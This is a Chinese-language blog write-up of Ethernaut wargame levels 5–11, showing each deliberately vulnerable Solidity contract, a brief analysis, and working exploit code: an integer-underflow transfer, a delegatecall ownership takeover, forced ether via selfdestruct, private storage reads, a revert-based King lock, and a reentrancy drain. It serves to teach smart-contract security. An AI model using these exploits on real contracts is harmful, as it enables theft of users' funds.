+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220216172446013.png" srcset="/img/loading.gif" lazyload alt="image-20220216172446013"></p>
+<h2 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h2><h3 id="闯关要求-4"><a href="#闯关要求-4" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这一关的目标是攻破下面这个基础 token 合约</p>
+<p>你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好  </p>
+<h3 id="合约代码-4"><a href="#合约代码-4" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-4"><a href="#合约分析-4" class="headerlink" title="合约分析"></a>合约分析</h3><p>整数溢出</p>
+<p>这里的balances和value都是无符号整数，所以无论如何他们相减之后值依旧大于等于0</p>
+<h3 id="攻击流程-4"><a href="#攻击流程-4" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address public con_addr = 0xf36B064eB8f9120392C6b352210566D6D8340700;<br>    address public trans_to = 0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624;<br>    Token token = Token(con_addr);<br>    uint overvalue = 21;<br><br>    function attack() public &#123;<br>        token.transfer(trans_to,overvalue);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220221164154258.png" srcset="/img/loading.gif" lazyload alt="image-20220221164154258"></p>
+<h2 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h2><h3 id="闯关要求-5"><a href="#闯关要求-5" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这一关的目标是申明你对你创建实例的所有权.</p>
+<h3 id="合约代码-5"><a href="#合约代码-5" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) public &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) public &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-5"><a href="#合约分析-5" class="headerlink" title="合约分析"></a>合约分析</h3><ul>
+<li><p><code>Solidity</code> 支持两种底层调用方式 <strong>call</strong> 和 <strong>delegatecall</strong></p>
+<p><strong>call</strong> 外部调用时，上下文是外部合约</p>
+<p><strong>delegatecall</strong> 外部调用时，上下文是调用合约</p>
+<p><strong>call</strong> 与 <strong>delegatecall</strong> 的功能类似，区别仅在于后者仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。</p>
+<p>函数的设计目的是为了使用存储在另一个合约的库代码。</p>
+<p>二者执行代码的上下文环境的不同，当使用call调用其它合约的函数时，代码是在被调用的合约的环境里执行，对应的，使用delegatecall进行函数调用时代码则是在调用函数的合约的环境里执行。</p>
+<p>所以 <code>delegate.delegatecall(msg.data)</code> 其实调用的是 <code>delegate</code> 自身的 <code>msg.data</code></p>
+</li>
+<li><p><code>data</code> 头<code>4</code>个 <code>byte</code> 是被调用方法的签名哈希，即 <code>bytes4(keccak256(&quot;func&quot;))</code> , <code>remix</code> 里调用函数，实际是向合约账户地址发送了( <code>msg.data[0:4]</code> == 函数签名哈希 )的一笔交易</p>
+<p>所以我们只需调用 <code>Delegation</code> 的 <code>fallback</code> 的同时在 <code>msg.data</code> 放入 <code>pwn</code> 函数的签名即可</p>
+</li>
+<li><p><code>fallback</code> 的触发条件：</p>
+<ul>
+<li>一是如果合约在被调用的时候，找不到对方调用的函数，就会自动调用 <code>fallback</code> 函数</li>
+<li>二是只要是合约收到别人发送的 <code>Ether</code> 且没有数据，就会尝试执行 <code>fallback</code> 函数，此时 <code>fallback</code> 需要带有 <code>payable</code> 标记，否则，合约就会拒绝这个 <code>Ether</code></li>
+</ul>
+</li>
+</ul>
+<p>所以，通过转账触发 <code>Delegation</code> 合约的 <code>fallback</code> 函数，同时设置 <code>data</code> 为 <code>pwn</code> 函数的标识符。</p>
+<h3 id="攻击流程-5"><a href="#攻击流程-5" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//sha3的返回值前两个为0x，所以要切0-10个字符。</span><br>contract.sendTransaction(&#123;<span class="hljs-attr">data</span>: web3.utils.sha3(<span class="hljs-string">&quot;pwn()&quot;</span>).slice(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>)&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>可能会out of gas，提高gas上限即可</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220227152252411.png" srcset="/img/loading.gif" lazyload alt="image-20220227152252411"></p>
+<h2 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h2><h3 id="闯关要求-6"><a href="#闯关要求-6" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>使合约的余额大于0</p>
+<h3 id="合约代码-6"><a href="#合约代码-6" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Force &#123;/*<br><br>                   MEOW ?<br>         /\_/\   /<br>    ____/ o o \<br>  /~____  =ø= /<br> (______)__m_m)<br><br>*/&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-6"><a href="#合约分析-6" class="headerlink" title="合约分析"></a>合约分析</h3><p>在以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点。</p>
+<h3 id="攻击流程-6"><a href="#攻击流程-6" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.4.20;<br><br>contract Force &#123;<br>    function Force() public payable &#123;&#125;<br>    function attack(address _target) public &#123;<br>        selfdestruct(_target);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以用<code>getBalance(instance)</code>来查询实例余额</p>
+<p>记得部署合约的时候存一点钱进去</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220221221632944.png" srcset="/img/loading.gif" lazyload alt="image-20220221221632944"></p>
+<h2 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h2><h3 id="闯关要求-7"><a href="#闯关要求-7" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>打开 vault 来通过这一关!</p>
+<h3 id="合约代码-7"><a href="#合约代码-7" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Vault &#123;<br>  bool public locked;<br>  bytes32 private password;<br><br>  constructor(bytes32 _password) public &#123;<br>    locked = true;<br>    password = _password;<br>  &#125;<br><br>  function unlock(bytes32 _password) public &#123;<br>    if (password == _password) &#123;<br>      locked = false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-7"><a href="#合约分析-7" class="headerlink" title="合约分析"></a>合约分析</h3><p>使用<code>web3.eth.getStorageAt()</code>方法返回一个以太坊地址的指定位置存储内容，借此获得密码内容</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223155339055.png" srcset="/img/loading.gif" lazyload alt="image-20220223155339055"></p>
+<h3 id="攻击流程-7"><a href="#攻击流程-7" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol>
+<li><p><code>web3.eth.getStorageAt(contract.address, 1)</code></p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161137206.png" srcset="/img/loading.gif" lazyload alt="image-20220223161137206"></p>
+</li>
+<li><p><code>contract.unlock(&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;)</code></p>
+<p>均报错</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/918b31ad3155cfc4d5e4bdd4e9841d5.png" srcset="/img/loading.gif" lazyload alt="918b31ad3155cfc4d5e4bdd4e9841d5"></p>
+<p>成功</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161340419.png" srcset="/img/loading.gif" lazyload alt="image-20220223161340419"></p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161409985.png" srcset="/img/loading.gif" lazyload alt="image-20220223161409985"></p>
+</li>
+</ol>
+<h2 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h2><h3 id="闯关要求-8"><a href="#闯关要求-8" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.</p>
+<p>这么有趣的游戏, 你的目标是攻破他.</p>
+<p>当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.</p>
+<h3 id="合约代码-8"><a href="#合约代码-8" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract King &#123;<br><br>  address payable king;<br>  uint public prize;<br>  address payable public owner;<br><br>  constructor() public payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    king.transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address payable) &#123;<br>    return king;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-8"><a href="#合约分析-8" class="headerlink" title="合约分析"></a>合约分析</h3><p>只要国王拒绝接收奖励即可一直当国王。那么我们可以部署攻击合约，使用 <code>revert()</code> 占据合约的king不放</p>
+<h3 id="攻击流程-8"><a href="#攻击流程-8" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol>
+<li><p>查询目前最高价</p>
+<p><code>web3.utils.fromWei</code> 能将给定的以wei为单位的值转换为其他单位的数值。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;ether&#x27;</span>); <span class="hljs-comment">//默认</span><br>&gt; <span class="hljs-string">&quot;0.000000000000000001&quot;</span><br><br>web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;finney&#x27;</span>);<br>&gt; <span class="hljs-string">&quot;0.000000000000001&quot;</span><br><br>web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;szabo&#x27;</span>);<br>&gt; <span class="hljs-string">&quot;0.000000000001&quot;</span><br><br>web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;shannon&#x27;</span>);<br>&gt; <span class="hljs-string">&quot;0.000000001&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>直接使用 <code>fromWei(contract.prize)</code> 会报错</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223220836386.png" srcset="/img/loading.gif" lazyload alt="image-20220223220836386"></p>
+<p>可使用 <code>toBN()</code> 转换一下</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223220944150.png" srcset="/img/loading.gif" lazyload alt="image-20220223220944150"></p>
+<p>即出价比0.001ether高即可</p>
+</li>
+<li><p>查询现在的king</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223221109151.png" srcset="/img/loading.gif" lazyload alt="image-20220223221109151"></p>
+</li>
+<li><p>部署合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.4.18;<br><br>contract attack &#123;<br>    function attack(address _add) public payable &#123;<br>        _add.call.gas(1000000).value(msg.value)();<br>    &#125;<br><br>    function () public &#123;<br>        revert();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p>提交实例</p>
+<p>可以看到再次查询king的地址变为了攻击合约的地址</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223221202590.png" srcset="/img/loading.gif" lazyload alt="image-20220223221202590"></p>
+</li>
+</ol>
+<h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h2><h3 id="闯关要求-9"><a href="#闯关要求-9" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这一关的目标是偷走合约的所有资产.</p>
+<h3 id="合约代码-9"><a href="#合约代码-9" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-9"><a href="#合约分析-9" class="headerlink" title="合约分析"></a>合约分析</h3><p>重入</p>
+<h3 id="攻击流程-9"><a href="#攻击流程-9" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br><br>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br><br>contract exploit &#123; <br>  //设定目标合约地址<br>  Reentrance reentrance;<br>  constructor(address payable instance_add) public payable &#123;<br>    reentrance = Reentrance(instance_add);<br>  &#125;<br><br>  //重写fallback<br>  fallback() external payable &#123;<br>    if(address(reentrance).balance &gt;= 0 ether)&#123;<br>      reentrance.withdraw(0.001 ether);<br>    &#125;<br>  &#125;<br><br>  //攻击，调用withdraw<br>  function attack() external &#123;<br>    reentrance.donate&#123;value: 0.002 ether&#125;(address(this));<br>    reentrance.withdraw(0.001 ether);<br>  &#125;<br><br>  //查询余额<br>  function instance_balance() public view returns (uint) &#123;<br>    return address(reentrance).balance;<br>  &#125;<br><br>   <br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>部署合约时打入一些钱</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201600577.png" srcset="/img/loading.gif" lazyload alt="image-20220224201600577"></p>
+<p>使用函数查询实例合约中原有余额</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224171227027.png" srcset="/img/loading.gif" lazyload alt="image-20220224171227027"></p>
+<p>攻击完成后再次查询余额</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201734086.png" srcset="/img/loading.gif" lazyload alt="image-20220224201734086"></p>
+<p>也可以在控制台中查询</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201803486.png" srcset="/img/loading.gif" lazyload alt="image-20220224201803486"></p>
+<h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11. Elevator"></a>11. Elevator</h2><h3 id="闯关要求-10"><a href="#闯关要求-10" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>电梯不会让你达到大楼顶部, 对吧?</p>
+<h3 id="合约代码-10"><a href="#合约代码-10" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-10"><a href="#合约分析-10" class="headerlink" title="合约分析"></a>合约分析</h3><p>重新编写isLastFloor函数，并设置flag初始为true。在实例的goTo函数中，会调用两次isLastFloor函数，即第一次让flag变为false，第二次让flag变为true</p>
+<h3 id="攻击流程-10"><a href="#攻击流程-10" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address instance_add = 0x98aD02A12F92eADb16dcF5285568CA7826B4b947;<br>    Elevator elevator = Elevator(instance_add);<br>    bool flag = true;<br><br>    function isLastFloor(uint) external returns (bool) &#123;<br>        flag = !flag;<br>        return flag;<br>    &#125;<br><br>    function attack() public &#123;<br>        elevator.goTo(5);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>查看top状态并提交实例</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224190112002.png" srcset="/img/loading.gif" lazyload alt="image-20220224190112002"></p>
